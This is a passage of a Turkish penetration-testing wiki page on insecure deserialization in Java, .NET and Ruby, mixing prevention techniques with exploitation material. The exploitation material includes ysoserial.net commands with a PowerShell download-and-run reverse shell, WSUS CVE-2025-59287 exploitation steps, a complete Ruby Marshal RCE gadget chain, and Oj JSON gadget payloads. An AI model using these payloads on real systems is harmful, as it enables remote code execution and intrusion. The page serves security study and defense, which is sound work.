Bu Java JSON kütüphanesi hakkında daha fazla bilgi edinin: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratuvarlar

- Eğer bazı ysoserial payload'larını test etmek istiyorsanız bu webapp'i **çalıştırabilirsiniz**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Neden

Java, aşağıdaki gibi çeşitli amaçlar için serialization'ı yoğun olarak kullanır:

- **HTTP requests**: Serialization, parametreler, ViewState, cookies vb. yönetiminde yaygın olarak kullanılır.
- **RMI (Remote Method Invocation)**: Java RMI protokolü, tamamen serialization'a dayandığı için Java uygulamalarında uzak iletişim için temel bir yapı taşıdır.
- **RMI over HTTP**: Bu yöntem, Java tabanlı thick client web uygulamaları tarafından yaygın olarak kullanılır ve tüm nesne iletişimlerinde serialization kullanır.
- **JMX (Java Management Extensions)**: JMX, nesneleri ağ üzerinden iletmek için serialization kullanır.
- **Custom Protocols**: Java'da standart uygulama, ham Java nesnelerinin iletimini içerir; bu, ilerideki exploit örneklerinde gösterilecektir.

### Önleme

#### Transient nesneler

`Serializable` implement eden bir sınıf, içinde serializable olmaması gereken herhangi bir nesneyi `transient` olarak işaretleyebilir. Örneğin:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### implements Serializable gerektiren bir sınıfın serileştirilmesini engelleme

Sınıf hiyerarşisi nedeniyle bazı **nesnelerin `Serializable` arayüzünü uygulaması gerektiği** senaryolarda, istemeden deserileştirme riski vardır. Bunu önlemek için, bu nesnelerin deserileştirilmesini engellemek amacıyla her zaman bir istisna fırlatan `final` bir `readObject()` metodu tanımlayın; aşağıda gösterildiği gibi:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Java'da Deserialization Güvenliğini Artırma**

**`java.io.ObjectInputStream`'ı özelleştirmek**, deserialization süreçlerini güvence altına almak için pratik bir yaklaşımdır. Bu yöntem şu durumlarda uygundur:

- Deserialization kodu sizin kontrolünüzdeyse.
- Deserialization için beklenen sınıflar biliniyorsa.

**`resolveClass()`** metodunu override ederek deserialization'ı sadece izin verilen sınıflarla sınırlayın. Bu, açıkça izin verilenler dışındaki hiçbir sınıfın deserialization'ını engeller; örneğin aşağıdaki örnek sadece `Bicycle` sınıfına izin verecek şekilde deserialization'ı kısıtlar:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Java Agent Kullanarak Güvenlik İyileştirmesi** kod değişikliği mümkün olmadığında bir yedek çözüm sunar. Bu yöntem esas olarak **blacklisting harmful classes** için bir JVM parametresi kullanılarak uygulanır:
```
-javaagent:name-of-agent.jar
```
Bu, kod değişikliklerinin hemen yapılamadığı ortamlarda ideal olan, deserialization işlemlerini dinamik olarak güvence altına almanın bir yolunu sağlar.

Bir örneğe bakın: [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementing Serialization Filters**: Java 9, **`ObjectInputFilter`** arayüzü aracılığıyla serialization filters'i tanıttı; bu, serialized nesnelerin deserialized edilmeden önce karşılaması gereken kriterleri belirtmek için güçlü bir mekanizma sağlar. Bu filtreler global olarak veya her bir stream için uygulanabilir ve deserialization sürecinde ayrıntılı kontrol sunar.

Serialization filters'i kullanmak için, tüm deserialization işlemlerine uygulanan global bir filter ayarlayabilir veya belirli stream'ler için bunu dinamik olarak yapılandırabilirsiniz. Örneğin:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Gelişmiş Güvenlik için Harici Kütüphanelerden Yararlanma**: **NotSoSerial**, **jdeserialize** ve **Kryo** gibi kütüphaneler Java deserialization süreçlerini kontrol etmek ve izlemek için gelişmiş özellikler sunar. Bu kütüphaneler, sınıf beyaz listeleme veya kara listeleme, deserialization öncesinde serileştirilmiş nesnelerin analiz edilmesi ve özel serileştirme stratejilerinin uygulanması gibi ek güvenlik katmanları sağlayabilir.

- **NotSoSerial** deserialization süreçlerini kesintiye uğratarak güvenilmeyen kodun yürütülmesini engeller.
- **jdeserialize** nesneleri deserializasyon yapmadan analiz etmeye izin vererek potansiyel olarak kötü amaçlı içeriği tespit etmeye yardımcı olur.
- **Kryo** hız ve verimliliği ön planda tutan alternatif bir serialization framework'üdür ve yapılandırılabilir serileştirme stratejileri ile güvenliği artırabilir.

### References

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Aşağıdaki sayfada JNDI Injection'ın ne olduğunu, RMI, CORBA & LDAP üzerinden nasıl kötüye kullanılacağını ve log4Shell'in nasıl exploit edileceğini (ve bu zaafiyete örnek) bulabilirsiniz:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> **Java Message Service (JMS)** API, iki veya daha fazla istemci arasında mesaj gönderimi için kullanılan bir Java mesaj odaklı middleware API'sidir. Producer–consumer problemini ele almak için bir uygulamadır. JMS, Java Platform, Enterprise Edition (Java EE) parçasıdır ve başlangıçta Sun Microsystems tarafından tanımlanan bir spesifikasyonla geliştirilmiş olup daha sonra Java Community Process tarafından yönlendirilmiştir. Java EE tabanlı uygulama bileşenlerinin mesaj oluşturmasına, göndermesine, almasına ve okumasına imkan veren bir mesajlaşma standardıdır. Dağıtık bir uygulamanın farklı bileşenleri arasında gevşek bağlı, güvenilir ve asenkron iletişim sağlar. (Kaynak: [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Products

Bu middleware'i kullanarak mesaj gönderen çeşitli ürünler bulunmaktadır:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Exploitation

Temelde, JMS'i tehlikeli şekilde kullanan birçok servis vardır. Bu nedenle, eğer bu servislere mesaj göndermek için yeterli ayrıcalığınız varsa (genellikle geçerli kimlik bilgileri gerekir) tüketici/abone tarafından deserialized edilecek şekilde kötü amaçlı serileştirilmiş nesneler gönderebilirsiniz.\
Bu, istismar sırasında o mesajı kullanacak tüm istemcilerin enfekte olacağı anlamına gelir.

Bir servisin (kullanıcı girdisini güvensiz şekilde deserializing ettiği için) savunmasız olsa dahi, istismarı gerçekleştirmek için uygun gadget'ları bulmanız gerektiğini unutmayın.

[JMET](https://github.com/matthiaskaiser/jmet) aracı, bu servislerle bağlantı kurup bilinen gadget'ları kullanarak çeşitli kötü amaçlı serileştirilmiş nesneler göndererek saldırı düzenlemek için oluşturulmuştur. Bu exploit'ler servis hâlâ savunmasızsa ve kullanılan gadget'lardan herhangi biri hedef uygulamanın içinde bulunuyorsa çalışacaktır.

### References

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net bağlamında, deserialization istismarları Java'daki gibi işler; gadget'lar, bir nesnenin deserializasyonu sırasında belirli kodları çalıştırmak için suiistimal edilir.

### Fingerprint

#### WhiteBox

Kaynak kod, aşağıdaki öğelerin varlığı için incelenmelidir:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Odak, türün kullanıcının kontrolündeki bir değişkenle belirlenmesine izin veren serializer'lar üzerinde olmalıdır.

#### BlackBox

Arama, Base64 olarak kodlanmış **AAEAAAD/////** dizisini veya sunucu tarafında deserializasyona uğrayabilecek ve deserialize edilecek tür üzerinde kontrol sağlayabilecek benzer desenleri hedeflemelidir. Bu, `TypeObject` veya `$type` içeren **JSON** veya **XML** yapıları gibi şeyleri de kapsayabilir.

### ysoserial.net

Bu durumda deserialization exploit'leri oluşturmak için [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) aracını kullanabilirsiniz. Git deposunu indirdikten sonra aracı Visual Studio gibi bir araçla derlemelisiniz.

**ysoserial.net'in nasıl exploit oluşturduğunu** öğrenmek isterseniz [**ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter'ın açıklandığı sayfayı**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md) inceleyebilirsiniz.

**ysoserial.net**'in ana seçenekleri: **`--gadget`**, **`--formatter`**, **`--output`** ve **`--plugin`.**

- **`--gadget`** istismarda kullanılacak gadget'ı belirtmek için kullanılır (deserialization sırasında komut çalıştırılacak sınıf/fonksiyonu belirtir).
- **`--formatter`** exploit'i serileştirmek için kullanılacak yöntemi belirtir (payload'u deserialize edecek backend'in hangi kütüphaneyi kullandığını bilip aynı kütüphaneyi kullanarak serileştirme yapmalısınız).
- **`--output`** exploit'in **raw** mı yoksa **base64** olarak mı çıkacağını belirtir. _Not: **ysoserial.net** payload'u varsayılan olarak **UTF-16LE** (Windows'ta varsayılan olan kodlama) ile encode edecektir; bu yüzden raw olarak alıp bir Linux konsolunda farklı şekilde encode ederseniz kodlama uyumsuzluğu nedeniyle exploit doğru çalışmayabilir (HTB JSON kutusunda payload hem UTF-16LE hem ASCII ile çalıştı ama bu her zaman böyle olacağı anlamına gelmez)._
- **`--plugin`** ysoserial.net, ViewState gibi belirli framework'ler için exploit oluşturacak plugin'leri destekler.

#### More ysoserial.net parameters

- `--minify` mümkünse **daha küçük bir payload** sağlar
- `--raf -f Json.Net -c "anything"` belirli bir formatter ile kullanılabilecek tüm gadget'ları listeler (`Json.Net` bu örnekte)
- `--sf xml` bir gadget (`-g`) belirtirseniz ysoserial.net "xml" içeren (büyük/küçük harf duyarsız) formatter'ları arayacaktır

**ysoserial examples** to create exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** ayrıca her exploit'in nasıl çalıştığını daha iyi anlamaya yardımcı olan **çok ilginç bir parametreye** sahiptir: `--test`\
Bu parametreyi belirtirseniz **ysoserial.net** **deneyecek** **exploit'i yerel olarak,** böylece payload'unuzun doğru çalışıp çalışmayacağını test edebilirsiniz.\
Bu parametre yararlıdır çünkü kodu incelerseniz aşağıdaki gibi kod parçacıkları bulursunuz (şuradan [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Bu, exploit'i test etmek için kodun [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) çağıracağı anlamına gelir.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
In the **previous code is vulnerable to the exploit created**. So if you find something similar in a .Net application it means that probably that application is vulnerable too.  
Therefore the **`--test`** parameter allows us to understand **which chunks of code are vulnerable** to the deserialization exploit that **ysoserial.net** can create.

### ViewState

Take a look to [this POST about **how to try to exploit the \_\_ViewState parameter of .Net** ](exploiting-__viewstate-parameter.md)to **execute arbitrary code.** If you **already know the secrets** used by the victim machine, [**read this post to know to execute code**](exploiting-__viewstate-knowing-the-secret.md)**.**

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Etkilenen endpoints:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie decrypted then deserialized with BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch and related SOAP ops that reach SoapFormatter sinks; base64 gadget is processed when the WSUS console ingests the event.
- Kök neden: attacker‑controlled bytes, strict allow‑lists/binders olmadan legacy .NET formatters (BinaryFormatter/SoapFormatter)'a ulaşıyor, bu yüzden gadget chains çoğunlukla WSUS servis hesabı (genellikle SYSTEM) olarak çalıştırılıyor.

Minimal exploitation (Reporting path):
1) Generate a .NET gadget with ysoserial.net (BinaryFormatter or SoapFormatter) and output base64, for example:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) `ReportEventBatch` için base64 gadget'ı gömerek SOAP oluşturun ve bunu `/ReportingWebService.asmx` adresine POST edin.
3) Bir admin WSUS konsolunu açtığında, event deserialized edilir ve gadget tetiklenir (RCE as SYSTEM).

AuthorizationCookie / GetCookie()
- Sahte bir AuthorizationCookie kabul edilebilir, deşifre edilebilir ve BinaryFormatter sink'ine iletilebilir; erişilebilirse pre‑auth RCE'ye olanak sağlar.

Public PoC (tecxx/CVE-2025-59287-WSUS) parametreleri:
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
See [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Önleme

To mitigate the risks associated with deserialization in .Net:

- **Veri akışlarının nesne türlerini tanımlamasına izin vermeyin.** Mümkün olduğunda `DataContractSerializer` veya `XmlSerializer` kullanın.
- **`JSON.Net` için `TypeNameHandling`'i `None` olarak ayarlayın:** `TypeNameHandling = TypeNameHandling.None`
- **`JavaScriptSerializer`'ı `JavaScriptTypeResolver` ile kullanmaktan kaçının.**
- **Deserileştirilebilecek türleri sınırlayın**, `System.IO.FileInfo` gibi .Net türlerinin barındırdığı riskleri anlayarak; bu türler sunucu dosyalarının özelliklerini değiştirebilir ve potansiyel olarak denial of service saldırılarına yol açabilir.
- **Riskli özelliklere sahip türlere karşı dikkatli olun**, `System.ComponentModel.DataAnnotations.ValidationException` gibi türlerin `Value` özelliği kötüye kullanılabilir.
- **Tür örneklemesini güvenli bir şekilde kontrol edin**; böylece saldırganların deserileştirme sürecini etkilemesini ve hatta `DataContractSerializer` veya `XmlSerializer`'ı savunmasız hale getirmesini önleyin.
- **Beyaz liste kontrolleri uygulayın**; `BinaryFormatter` ve `JSON.Net` için özel bir `SerializationBinder` kullanarak.
- **.Net içindeki bilinen güvensiz deserialization gadget'ları hakkında güncel kalın** ve deserializer'ların bu türleri örneklememesini sağlayın.
- **Potansiyel olarak riskli kodu**, `System.Windows.Data.ObjectDataProvider` gibi bilinen gadget'ların WPF uygulamalarında güvensiz veri kaynaklarına maruz kalmasını önlemek için internet erişimi olan koddan izole edin.

### **Referanslar**

- Java ve .Net JSON deserialization **makalesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** sunum: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby'de, serileştirme **marshal** kütüphanesindeki iki yöntemle gerçekleştirilir. İlk yöntem olan **dump**, bir nesneyi byte akışına dönüştürmek için kullanılır. Bu işleme serileştirme denir. Tersine, ikinci yöntem **load**, bir byte akışını tekrar nesneye çevirmek için kullanılır; buna deserileştirme denir.

Serileştirilmiş nesneleri güvence altına almak için **Ruby, HMAC (Hash-Based Message Authentication Code)** kullanır; bu, verinin bütünlüğü ve doğruluğunu sağlar. Bu amaçla kullanılan anahtar aşağıdaki yerlerden birinde saklanır:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (daha fazla bilgi için** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Ruby On Rails'ı istismar etmek için başka bir RCE zinciri: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() metodu

As explained in [**this vulnerability report**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), eğer bir kullanıcının temizlenmemiş girdisi bir ruby nesnesinin `.send()` metoduna ulaşırsa, bu metod nesnenin herhangi bir diğer metodunu **istediğiniz parametrelerle çağırmasına** izin verir.

For example, calling eval and then ruby code as second parameter will allow to execute arbitrary code:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Dahası, önceki writeup'ta belirtildiği gibi, eğer bir saldırgan sadece **`.send()`**'in tek bir parametresini kontrol ediyorsa, parametreye ihtiyaç duymayan veya parametrelerinin **varsayılan değerlere** sahip olduğu nesnenin herhangi bir metodunu çağırmak mümkündür.\
Bunun için, nesnenin tüm metotlarını listeleyerek **bu gereksinimleri karşılayan bazı ilginç metotları bulmak** mümkündür.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Nasıl mümkün olabileceğini görmek için [pollute a Ruby class and abuse it in here](ruby-class-pollution.md) sayfasına bakın.

### Ruby _json pollution

Bir isteğin gövdesine dizi gibi hash'lenemeyen bazı değerler gönderildiğinde, bunlar `_json` adlı yeni bir anahtara eklenecektir. Ancak, bir saldırgan isteğin gövdesine istediği rastgele değerlerle `_json` adlı bir değer de koyabilir. Sonrasında, örneğin backend bir parametrenin doğruluğunu kontrol edip daha sonra `_json` parametresini bir işlem yapmak için kullanıyorsa, bir authorisation bypass gerçekleştirilebilir.

Daha fazla bilgi için [Ruby _json pollution page](ruby-_json-pollution.md) sayfasına bakın.

### Diğer kütüphaneler

Bu teknik [ **from this blog post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared) adresinden alınmıştır.

Nesneleri serialize etmek için kullanılabilecek başka Ruby kütüphaneleri de vardır ve bu nedenle insecure deserialization sırasında RCE elde etmek için suistimal edilebilirler. Aşağıdaki tablo, bu kütüphanelerden bazılarının ve unserialized edildiğinde çağrılan yöntemlerin (temelde RCE elde etmek için suistimal edilebilecek fonksiyonlar) neler olduğunu gösterir:

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Kütüphane</strong></td><td><strong>Girdi verisi</strong></td><td><strong>Sınıf içindeki başlatan yöntem</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (sınıf anahtar olarak hash(map) içine konulmalıdır)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (sınıf anahtar olarak hash(map) içine konulmalıdır)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (sınıf anahtar olarak hash(map) içine konulmalıdır)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([see notes regarding json_create at end](#table-vulnerable-sinks))</td></tr></tbody></table>

Temel örnek:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
Oj'i suistimal etmeye çalışırken, içinde `hash` fonksiyonu olan ve bu fonksiyonun `to_s`'i; `to_s`'in spec'i; spec'in de fetch_path'i çağıracağı bir gadget class bulmak mümkündü. fetch_path'i rastgele bir URL'i getirecek şekilde çalıştırmak mümkün olduğundan, bu tür temizlenmemiş deserialization zaafiyetlerinin tespiti için harika bir dedektör sağlıyordu.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Ayrıca, önceki teknikle sistemde bir klasör de oluşturulduğu tespit edildi; bu, başka bir gadget'ı istismar ederek bunu tam bir RCE'ye dönüştürmek için bir gerekliliktir, örneğin:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Daha fazla ayrıntı için [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (tam metin için [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

The Rails app’s file upload functionality lets an attacker write files arbitrarily. Although the app runs with restrictions (only certain directories like tmp are writable due to Docker’s non-root user), this still allows writing to the Bootsnap cache directory (typically under tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap speeds up Rails boot times by caching compiled Ruby code, YAML, and JSON files. It stores cache files that include a cache key header (with fields like Ruby version, file size, mtime, compile options, etc.) followed by the compiled code. This header is used to validate the cache during app startup.

- Gather File Metadata

The attacker first selects a target file that is likely loaded during Rails startup (for example, set.rb from Ruby’s standard library). By executing Ruby code inside the container, they extract critical metadata (such as RUBY_VERSION, RUBY_REVISION, size, mtime, and compile_option). This data is essential for crafting a valid cache key.

- Compute the Cache File Path

By replicating Bootsnap’s FNV-1a 64-bit hash mechanism, the correct cache file path is determined. This step ensures that the malicious cache file is placed exactly where Bootsnap expects it (e.g., under tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

The attacker prepares a payload that:

- Executes arbitrary commands (for example, running id to show process info).
- Removes the malicious cache after execution to prevent recursive exploitation.
- Loads the original file (e.g., set.rb) to avoid crashing the application.

